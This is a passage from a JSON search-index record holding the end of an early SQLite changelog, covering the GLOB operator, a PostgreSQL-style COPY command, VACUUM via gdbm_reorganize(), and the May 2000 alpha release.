the LIKE operator. Added a GLOB operator: similar to LIKE but it uses Unix shell globbing wildcards instead of the '%' and '_' wildcards of SQL. Added the COPY command patterned after PostgreSQL so that SQLite can now read the output of the pg_dump database dump utility of PostgreSQL. Added a VACUUM command that calls the gdbm_reorganize() function on the underlying database files. And many, many bug fixes... 2000-05-29 Initial Public Release of Alpha code ",
        "_version_": 1718527429878743040
      }
    ]
  }
}
